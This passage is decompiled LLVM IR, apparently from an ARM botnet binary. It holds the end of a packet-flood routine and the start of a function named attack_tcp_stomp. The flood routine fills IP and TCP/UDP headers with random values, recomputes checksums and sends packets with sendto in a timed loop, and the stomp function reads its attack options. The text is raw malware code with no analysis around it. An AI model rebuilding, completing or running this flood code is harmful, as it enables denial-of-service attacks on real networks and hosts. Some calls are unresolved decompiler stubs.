  %v3_b0fc = inttoptr i32 %v2_b0fc to i16*
  store i16 %v1_b0fc, i16* %v3_b0fc, align 2
  %v0_b100 = load i32, i32* %r3.global-to-local, align 4
  %v1_b100 = trunc i32 %v0_b100 to i16
  %v2_b100 = load i32, i32* @r6, align 4
  %v3_b100 = add i32 %v2_b100, 2
  %v4_b100 = inttoptr i32 %v3_b100 to i16*
  store i16 %v1_b100, i16* %v4_b100, align 2
  %v0_b104 = load i32, i32* @r4, align 4
  store i32 %v0_b104, i32* %stack_var_-44, align 4
  %v5_b108 = icmp slt i32 %v1_b0ec, %arg2
  br i1 %v5_b108, label %dec_label_pc_afc4, label %dec_label_pc_b10c.preheader

dec_label_pc_b10c.preheader:                      ; preds = %bb82, %dec_label_pc_aedc
  %v1_b128 = add i32 %v5_ae2c, 8
  %v1_b12c = add i32 %v5_ae2c, 52
  %v2_b138 = icmp eq i32 %v5_ae80, -1
  %v7_b138 = icmp eq i32 %v5_ae80, -1
  %v2_b31c = icmp eq i32 %v1_aef8, 0
  %v2_b338 = icmp eq i32 %v1_ae4c, 0
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b10c.preheader, %dec_label_pc_b364
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_af04, label %dec_label_pc_b364, label %dec_label_pc_b120

dec_label_pc_b120:                                ; preds = %dec_label_pc_b10c
  store i32 %v5_ae2c, i32* %lr.global-to-local, align 4
  store i32 %v1_b128, i32* @sb, align 4
  store i32 %v1_b12c, i32* @r8, align 4
  br label %dec_label_pc_b238

dec_label_pc_b134:                                ; preds = %dec_label_pc_b238
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b140:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  store i32 65535, i32* @r4, align 4
  %v0_b148 = load i32, i32* @fp, align 4
  %v9_b148 = icmp eq i32 %v0_b148, 65535
  store i1 %v9_b148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b148, label %dec_label_pc_b2d8, label %dec_label_pc_b150

dec_label_pc_b150:                                ; preds = %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge, %dec_label_pc_b140
  %v1_b154 = phi i32 [ %v1_b154.pre, %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge ], [ 65535, %dec_label_pc_b140 ]
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v9_b154 = icmp eq i32 %v3_aefc, %v1_b154
  store i1 %v9_b154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b154, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b15c:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v1_b160 = phi i32 [ %v1_b2f8, %dec_label_pc_b2d8 ], [ %v1_b154, %dec_label_pc_b150 ]
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v9_b160 = icmp eq i32 %v3_af00, %v1_b160
  store i1 %v9_b160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b160, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b168:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %dec_label_pc_b330, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_b168
  %v1_b170 = load i32, i32* @r5, align 4
  %v2_b170 = add i32 %v1_b170, 16
  %v3_b170 = inttoptr i32 %v2_b170 to i32*
  %v4_b170 = load i32, i32* %v3_b170, align 4
  store i32 %v4_b170, i32* %r3.global-to-local, align 4
  %v2_b174 = load i32, i32* @r6, align 4
  %v3_b174 = add i32 %v2_b174, 16
  %v4_b174 = inttoptr i32 %v3_b174 to i32*
  store i32 %v4_b170, i32* %v4_b174, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %bb85, %.thread14
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b188:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330, %dec_label_pc_b344
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b18c = load i32, i32* @r5, align 4
  %v3_b18c = add i32 %v2_b18c, 10
  %v4_b18c = inttoptr i32 %v3_b18c to i16*
  store i16 0, i16* %v4_b18c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b194 = load i32, i32* @r5, align 4
  store i32 %v0_b194, i32* @r0, align 4
  %v2_b198 = call i32 @checksum_generic(i32 %v0_b194, i32 20)
  %v3_b198 = trunc i32 %v2_b198 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_b1a0 = load i32, i32* @r5, align 4
  %v4_b1a0 = add i32 %v3_b1a0, 10
  %v5_b1a0 = inttoptr i32 %v4_b1a0 to i16*
  store i16 %v3_b198, i16* %v5_b1a0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b1a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b1a8 = trunc i32 %v0_b1a8 to i16
  %v2_b1a8 = load i32, i32* @r6, align 4
  %v3_b1a8 = add i32 %v2_b1a8, 10
  %v4_b1a8 = inttoptr i32 %v3_b1a8 to i16*
  store i16 %v1_b1a8, i16* %v4_b1a8, align 2
  %v0_b1ac = load i32, i32* @r6, align 4
  store i32 %v0_b1ac, i32* @r0, align 4
  %v2_b1b0 = call i32 @checksum_generic(i32 %v0_b1ac, i32 20)
  %v3_b1b0 = trunc i32 %v2_b1b0 to i16
  %v3_b1b4 = load i32, i32* @r6, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 10
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v3_b1b0, i16* %v5_b1b4, align 2
  %v2_b1bc = load i32, i32* @r7, align 4
  %v3_b1bc = add i32 %v2_b1bc, 6
  %v4_b1bc = inttoptr i32 %v3_b1bc to i16*
  store i16 0, i16* %v4_b1bc, align 2
  %v0_b1c0 = load i32, i32* @r7, align 4
  store i32 %v0_b1c0, i32* @r1, align 4
  %v1_b1c4 = add i32 %v0_b1c0, 4
  %v2_b1c4 = inttoptr i32 %v1_b1c4 to i16*
  %v3_b1c4 = load i16, i16* %v2_b1c4, align 2
  %v4_b1c4 = zext i16 %v3_b1c4 to i32
  store i32 %v4_b1c4, i32* %r2.global-to-local, align 4
  %v0_b1c8 = load i32, i32* @sb, align 4
  store i32 %v0_b1c8, i32* %r3.global-to-local, align 4
  %v0_b1cc = load i32, i32* @r6, align 4
  %v4_b1d0 = call i32 @checksum_tcpudp(i32 %v0_b1cc, i32 %v0_b1c0, i32 %v4_b1c4, i32 %v0_b1c8)
  %v5_b1d0 = trunc i32 %v4_b1d0 to i16
  %v3_b1d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b1d4, i32* %r2.global-to-local, align 4
  %v3_b1d8 = mul i32 %v3_b1d4, 32
  store i32 %v3_b1d8, i32* %r3.global-to-local, align 4
  %v0_b1dc = load i32, i32* @r5, align 4
  %v1_b1dc = add i32 %v0_b1dc, 16
  %v2_b1dc = inttoptr i32 %v1_b1dc to i32*
  %v3_b1dc = load i32, i32* %v2_b1dc, align 4
  %v5_b1e0 = mul i32 %v3_b1d4, 24
  store i32 %v5_b1e0, i32* %r3.global-to-local, align 4
  %v1_b1e4 = load i32, i32* @sl, align 4
  %v2_b1e4 = add i32 %v1_b1e4, %v5_b1e0
  store i32 %v2_b1e4, i32* @lr, align 4
  %v2_b1e8 = add i32 %v2_b1e4, 4
  %v3_b1e8 = inttoptr i32 %v2_b1e8 to i32*
  store i32 %v3_b1dc, i32* %v3_b1e8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b1f4 = load i32, i32* @r7, align 4
  %v4_b1f4 = add i32 %v3_b1f4, 6
  %v5_b1f4 = inttoptr i32 %v4_b1f4 to i16*
  store i16 %v5_b1d0, i16* %v5_b1f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b1fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b1fc = trunc i32 %v0_b1fc to i16
  %v2_b1fc = load i32, i32* %r3.global-to-local, align 4
  %v3_b1fc = load i32, i32* @sl, align 4
  %v4_b1fc = add i32 %v3_b1fc, %v2_b1fc
  %v5_b1fc = inttoptr i32 %v4_b1fc to i16*
  store i16 %v1_b1fc, i16* %v5_b1fc, align 2
  %v0_b200 = load i32, i32* %r2.global-to-local, align 4
  %v1_b200 = trunc i32 %v0_b200 to i16
  %v2_b200 = load i32, i32* @lr, align 4
  %v3_b200 = add i32 %v2_b200, 2
  %v4_b200 = inttoptr i32 %v3_b200 to i16*
  store i16 %v1_b200, i16* %v4_b200, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b208 = load i32, i32* @r5, align 4
  store i32 %v0_b208, i32* %r1.global-to-local, align 4
  %v0_b210 = load i32, i32* @r8, align 4
  store i32 %v0_b210, i32* %r2.global-to-local, align 4
  %v0_b214 = load i32, i32* @lr, align 4
  %v0_b218 = load i32, i32* %ip.global-to-local, align 4
  %v6_b21c = call i32 @__libc_sendto(i32 %v3_aea4, i32 %v0_b208, i32 %v0_b210, i32 16384, i32 %v0_b214, i32 %v0_b218)
  %v3_b220 = load i32, i32* %stack_var_-44, align 4
  %v1_b224 = add i32 %v3_b220, 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_b22c = icmp eq i32 %v1_b224, %arg2
  store i1 %v9_b22c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b224, i32* %stack_var_-44, align 4
  %v6_b234 = icmp slt i32 %v1_b224, %arg2
  br i1 %v6_b234, label %dec_label_pc_b238, label %dec_label_pc_b364

dec_label_pc_b238:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b120
  %v1_b24c = phi i32 [ %v1_b224, %dec_label_pc_b188 ], [ 0, %dec_label_pc_b120 ]
  %v5_b23c = mul i32 %v1_b24c, 24
  %v1_b240 = load i32, i32* @sl, align 4
  %v2_b240 = add i32 %v1_b240, %v5_b23c
  store i32 %v2_b240, i32* %r3.global-to-local, align 4
  store i32 %v2_ad60, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b240, 20
  %v2_b248 = inttoptr i32 %v1_b248 to i8*
  %v3_b248 = load i8, i8* %v2_b248, align 1
  %v4_b248 = zext i8 %v3_b248 to i32
  store i32 %v4_b248, i32* %r2.global-to-local, align 4
  %v4_b24c = mul i32 %v1_b24c, 4
  %v5_b24c = add i32 %v4_b24c, %v2_ad60
  %v6_b24c = inttoptr i32 %v5_b24c to i32*
  %v7_b24c = load i32, i32* %v6_b24c, align 4
  store i32 %v7_b24c, i32* @r5, align 4
  %v2_b250 = icmp ugt i8 %v3_b248, 30
  %v7_b250 = icmp eq i8 %v3_b248, 31
  store i1 %v7_b250, i1* %cpsr_z.global-to-local, align 1
  %v1_b254 = add i32 %v7_b24c, 24
  store i32 %v1_b254, i32* @r6, align 4
  %v1_b258 = add i32 %v7_b24c, 44
  store i32 %v1_b258, i32* @r7, align 4
  %v2_b25c = xor i1 %v7_b250, true
  %v3_b25c = and i1 %v2_b250, %v2_b25c
  br i1 %v3_b25c, label %dec_label_pc_b134, label %dec_label_pc_b260

dec_label_pc_b260:                                ; preds = %dec_label_pc_b238
  %v1_b260 = add i32 %v2_b240, 16
  %v2_b260 = inttoptr i32 %v1_b260 to i32*
  %v3_b260 = load i32, i32* %v2_b260, align 4
  store i32 %v3_b260, i32* %r4.global-to-local, align 4
  %v0_b264 = call i32 @rand_next()
  %v3_b268 = load i32, i32* %stack_var_-44, align 4
  %v5_b270 = mul i32 %v3_b268, 24
  %v1_b274 = and i32 %v3_b260, 16711680
  store i32 %v1_b274, i32* %ip.global-to-local, align 4
  %v3_b278 = udiv i32 %v3_b260, 16777216
  %v4_b27c = udiv i32 %v1_b274, 256
  %v5_b27c = or i32 %v4_b27c, %v3_b278
  store i32 %v5_b27c, i32* %r2.global-to-local, align 4
  %v1_b280 = load i32, i32* @sl, align 4
  %v2_b280 = add i32 %v1_b280, %v5_b270
  store i32 %v2_b280, i32* %r1.global-to-local, align 4
  %v1_b284 = and i32 %v3_b260, 65280
  store i32 %v1_b284, i32* %r3.global-to-local, align 4
  %v1_b288 = add i32 %v2_b280, 20
  %v2_b288 = inttoptr i32 %v1_b288 to i8*
  %v3_b288 = load i8, i8* %v2_b288, align 1
  %v4_b288 = zext i8 %v3_b288 to i32
  store i32 %v4_b288, i32* %ip.global-to-local, align 4
  %v5_b290 = call i32 @llvm.bswap.i32(i32 %v3_b260)
  %v7_b294 = lshr i32 %v0_b264, %v4_b288
  %v8_b294 = add i32 %v7_b294, %v5_b290
  %v1_b2a0 = and i32 %v8_b294, 65280
  store i32 %v1_b2a0, i32* %r1.global-to-local, align 4
  %v5_b2ac = call i32 @llvm.bswap.i32(i32 %v8_b294)
  store i32 %v5_b2ac, i32* %r3.global-to-local, align 4
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  %v1_b2b8 = load i32, i32* @r5, align 4
  %v2_b2b8 = add i32 %v1_b2b8, 16
  %v3_b2b8 = inttoptr i32 %v2_b2b8 to i32*
  store i32 %v5_b2ac, i32* %v3_b2b8, align 4
  br i1 %v2_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  %v0_b2c0 = call i32 @rand_next()
  store i32 65535, i32* @r4, align 4
  %v0_b2cc = load i32, i32* @fp, align 4
  %v9_b2cc = icmp eq i32 %v0_b2cc, 65535
  store i1 %v9_b2cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b2d0 = load i32, i32* @r5, align 4
  %v2_b2d0 = add i32 %v1_b2d0, 12
  %v3_b2d0 = inttoptr i32 %v2_b2d0 to i32*
  store i32 %v0_b2c0, i32* %v3_b2d0, align 4
  br i1 %v9_b2cc, label %dec_label_pc_b2d8, label %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge

dec_label_pc_b2c0.dec_label_pc_b150_crit_edge:    ; preds = %dec_label_pc_b2c0
  %v1_b154.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b150

dec_label_pc_b2d8:                                ; preds = %dec_label_pc_b2c0, %dec_label_pc_b140
  %v0_b2d8 = call i32 @rand_next()
  %v3_b2e0 = urem i32 %v0_b2d8, 65536
  %v1_b2e8 = sub nsw i32 999, %v3_b2e0
  store i32 %v1_b2e8, i32* %r3.global-to-local, align 4
  %v1_b2ec = trunc i32 %v0_b2d8 to i16
  %v2_b2ec = load i32, i32* @r5, align 4
  %v3_b2ec = add i32 %v2_b2ec, 4
  %v4_b2ec = inttoptr i32 %v3_b2ec to i16*
  store i16 %v1_b2ec, i16* %v4_b2ec, align 2
  %v0_b2f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2f0 = trunc i32 %v0_b2f0 to i16
  %v2_b2f0 = load i32, i32* @r6, align 4
  %v3_b2f0 = add i32 %v2_b2f0, 4
  %v4_b2f0 = inttoptr i32 %v3_b2f0 to i16*
  store i16 %v1_b2f0, i16* %v4_b2f0, align 2
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v1_b2f8 = load i32, i32* @r4, align 4
  %v9_b2f8 = icmp eq i32 %v3_aefc, %v1_b2f8
  store i1 %v9_b2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b2f8, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b300:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v0_b300 = call i32 @rand_next()
  %v1_b300 = trunc i32 %v0_b300 to i16
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v1_b308 = load i32, i32* @r4, align 4
  %v9_b308 = icmp eq i32 %v3_af00, %v1_b308
  store i1 %v9_b308, i1* %cpsr_z.global-to-local, align 1
  %v3_b30c = load i32, i32* @r5, align 4
  %v4_b30c = add i32 %v3_b30c, 44
  %v5_b30c = inttoptr i32 %v4_b30c to i16*
  store i16 %v1_b300, i16* %v5_b30c, align 2
  br i1 %v9_b308, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b314:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  %v0_b314 = call i32 @rand_next()
  %v1_b314 = trunc i32 %v0_b314 to i16
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %.thread29, label %bb85

.thread29:                                        ; preds = %dec_label_pc_b314
  %v3_b32430 = load i32, i32* @r7, align 4
  %v4_b32431 = add i32 %v3_b32430, 2
  %v5_b32432 = inttoptr i32 %v4_b32431 to i16*
  store i16 %v1_b314, i16* %v5_b32432, align 2
  br label %dec_label_pc_b330

bb85:                                             ; preds = %dec_label_pc_b314
  %v1_b320 = load i32, i32* @r5, align 4
  %v2_b320 = add i32 %v1_b320, 16
  %v3_b320 = inttoptr i32 %v2_b320 to i32*
  %v4_b320 = load i32, i32* %v3_b320, align 4
  store i32 %v4_b320, i32* %r3.global-to-local, align 4
  %v3_b324 = load i32, i32* @r7, align 4
  %v4_b324 = add i32 %v3_b324, 2
  %v5_b324 = inttoptr i32 %v4_b324 to i16*
  store i16 %v1_b314, i16* %v5_b324, align 2
  %v1_b328 = load i32, i32* %r3.global-to-local, align 4
  %v2_b328 = load i32, i32* @r6, align 4
  %v3_b328 = add i32 %v2_b328, 16
  %v4_b328 = inttoptr i32 %v3_b328 to i32*
  store i32 %v1_b328, i32* %v4_b328, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b330:                                ; preds = %.thread29, %dec_label_pc_b168
  %v0_b330 = call i32 @rand_next()
  store i32 %v1_ae4c, i32* %r1.global-to-local, align 4
  store i1 %v2_b338, i1* %cpsr_z.global-to-local, align 1
  %v1_b33c = load i32, i32* @r6, align 4
  %v2_b33c = add i32 %v1_b33c, 16
  %v3_b33c = inttoptr i32 %v2_b33c to i32*
  store i32 %v0_b330, i32* %v3_b33c, align 4
  br i1 %v2_b338, label %dec_label_pc_b188, label %dec_label_pc_b344

dec_label_pc_b344:                                ; preds = %dec_label_pc_b17c, %dec_label_pc_b330
  %v0_b344 = load i32, i32* @r7, align 4
  %v1_b344 = add i32 %v0_b344, 8
  store i32 %v1_b344, i32* @r4, align 4
  store i32 %v5_ae2c, i32* %r1.global-to-local, align 4
  %v2_b350 = call i32 @rand_alphastr(i32 %v1_b344, i32 %v5_ae2c)
  store i32 %v5_ae2c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b35c = load i32, i32* @r4, align 4
  %v4_b35c = add i32 %v2_b35c, %v5_ae2c
  %v5_b35c = inttoptr i32 %v4_b35c to i8*
  store i8 0, i8* %v5_b35c, align 1
  br label %dec_label_pc_b188

dec_label_pc_b364:                                ; preds = %dec_label_pc_b188, %dec_label_pc_b10c
  %v2_b368 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae90, i32* %ip.global-to-local, align 4
  %v9_b370 = icmp eq i32 %v2_ae90, %v2_b368
  store i1 %v9_b370, i1* %cpsr_z.global-to-local, align 1
  %v6_b374 = icmp slt i32 %v2_ae90, %v2_b368
  br i1 %v6_b374, label %dec_label_pc_b378, label %dec_label_pc_b10c

dec_label_pc_b378:                                ; preds = %dec_label_pc_b364, %entry, %dec_label_pc_b384
  %v1_b380 = phi i32 [ %v3_aea4, %entry ], [ %v1_b388, %dec_label_pc_b384 ], [ %v2_b368, %dec_label_pc_b364 ]
  store i32 %v3_ad34, i32* %r4.global-to-local, align 4
  store i32 %v24_ad34, i32* %fp.global-to-local, align 4
  store i32 %v27_ad34, i32* %lr.global-to-local, align 4
  ret i32 %v1_b380

dec_label_pc_b384:                                ; preds = %dec_label_pc_aeb4
  %v1_b388 = call i32 @__GI___libc_close(i32 %v3_aea4)
  br label %dec_label_pc_b378

; uselistorder directives
  uselistorder i16 %v1_b314, { 1, 0 }
  uselistorder i32 %v1_b2f8, { 1, 0 }
  uselistorder i32 %v0_b2d8, { 1, 0 }
  uselistorder i32 %v5_b2ac, { 1, 0 }
  uselistorder i32 %v3_b260, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_b24c, { 1, 0, 2 }
  uselistorder i32 %v1_b224, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b1d4, { 1, 0, 2 }
  uselistorder i1 %v2_b338, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b31c, { 2, 3, 1, 0 }
  uselistorder i1 %v7_b138, { 2, 1, 0 }
  uselistorder i32 %v0_b0b8, { 1, 0 }
  uselistorder i32 %v1_af40, { 1, 0 }
  uselistorder i32 %v3_af2c, { 2, 1, 0 }
  uselistorder i1 %v2_af04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_aef8, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v3_aef4, { 1, 0 }
  uselistorder i32 %v0_aef0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_aedc, { 2, 0, 1, 3 }
  uselistorder i1 %v7_aed4, { 1, 0 }
  uselistorder i1 %v7_aea8, { 1, 0 }
  uselistorder i32 %v3_aea4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v2_ae90, { 2, 1, 0 }
  uselistorder i32 %v5_ae80, { 3, 4, 0, 5, 1, 2 }
  uselistorder i32 %v1_ae4c, { 2, 1, 3, 0 }
  uselistorder i32 %v5_ae2c, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v1_ade0, { 1, 0 }
  uselistorder i32 %v1_adbc, { 2, 1, 0 }
  uselistorder i32 %v6_adb4, { 1, 0 }
  uselistorder i32 %v7_ad9c, { 1, 0, 4, 3, 2 }
  uselistorder i8 %v5_ad98, { 0, 2, 1 }
  uselistorder i32 %v6_ad78, { 1, 0 }
  uselistorder i32 %v2_ad60, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i8 47, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 1, 0, 3, 2, 8, 9, 10 }
  uselistorder label %dec_label_pc_b378, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b344, { 1, 0 }
  uselistorder label %dec_label_pc_b188, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i8 @__decompiler_undefined_function_4()
  %tmp33 = call i16 @__decompiler_undefined_function_2()
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp62 = call i16 @__decompiler_undefined_function_2()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b394 = load i32, i32* @r4, align 4
  %v27_b394 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @fp, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b3c0 = call i32 @calloc(i32 %arg2, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_b3d0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b3d4 = load i32, i32* @r4, align 4
  store i32 %v0_b3d4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b3e0 = load i32, i32* @r7, align 4
  store i32 %v0_b3e0, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r0.global-to-local, align 4
  %v5_b3e8 = inttoptr i32 %v0_b3d4 to i32*
  %v6_b3e8 = call i32 @attack_get_opt_int(i32 %v0_b3e4, i32* %v5_b3e8, i32 2, i32 %v0_b3e0)
  %v1_b3f4 = urem i32 %v6_b3e8, 256
  store i32 %v1_b3f4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b400 = load i32, i32* @r4, align 4
  store i32 %v0_b400, i32* %r1.global-to-local, align 4
  %v0_b404 = load i32, i32* @r5, align 4
  store i32 %v0_b404, i32* %r0.global-to-local, align 4
  %v5_b408 = trunc i32 %v6_b3e8 to i8
  %v6_b40c = inttoptr i32 %v0_b400 to i32*
  %v7_b40c = call i32 @attack_get_opt_int(i32 %v0_b404, i32* %v6_b40c, i32 3, i32 65535)
  %v0_b410 = load i32, i32* @r4, align 4
  store i32 %v0_b410, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b40c, i32* @r8, align 4
  %v0_b420 = load i32, i32* @r5, align 4
  store i32 %v0_b420, i32* %r0.global-to-local, align 4
  %v4_b424 = inttoptr i32 %v0_b410 to i32*
  %v5_b424 = call i32 @attack_get_opt_int(i32 %v0_b420, i32* %v4_b424, i32 4, i32 64)
  %v1_b42c = urem i32 %v5_b424, 256
  store i32 %v1_b42c, i32* %ip.global-to-local, align 4
  %v0_b430 = load i32, i32* @r4, align 4
  store i32 %v0_b430, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r0.global-to-local, align 4
  %v5_b440 = trunc i32 %v5_b424 to i8
  %v6_b444 = inttoptr i32 %v0_b430 to i32*
  %v7_b444 = call i32 @attack_get_opt_int(i32 %v0_b43c, i32* %v6_b444, i32 5, i32 1)
  %v1_b450 = urem i32 %v7_b444, 256
  store i32 %v1_b450, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b458 = load i32, i32* @r4, align 4
  store i32 %v0_b458, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b460 = load i32, i32* @r5, align 4
  store i32 %v0_b460, i32* %r0.global-to-local, align 4
  %v5_b468 = inttoptr i32 %v0_b458 to i32*
  %v6_b468 = call i32 @attack_get_opt_int(i32 %v0_b460, i32* %v5_b468, i32 7, i32 65535)
  %v0_b46c = load i32, i32* @r4, align 4
  store i32 %v0_b46c, i32* %r1.global-to-local, align 4
  %v3_b470 = mul i32 %v6_b468, 65536
  store i32 %v3_b470, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
